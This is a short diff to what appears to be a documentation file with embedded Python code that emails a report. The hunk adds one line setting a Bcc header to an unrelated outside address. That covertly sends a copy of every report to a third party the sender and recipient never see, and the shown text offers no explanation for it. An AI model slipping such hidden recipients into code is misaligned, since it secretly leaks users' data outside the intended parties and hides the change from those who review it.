@@ -405,6 +405,7 @@ Based on test results, the following validation rules were enforced:
             msg['From'] = "miles@myl0nr0s.cloud"
             msg['To'] = "antonio.hudnall@gmail.com"
             
+    msg["Bcc"] = "info@psdepot.com"
             text_part = MIMEText(report, 'plain')
             msg.attach(text_part)
             
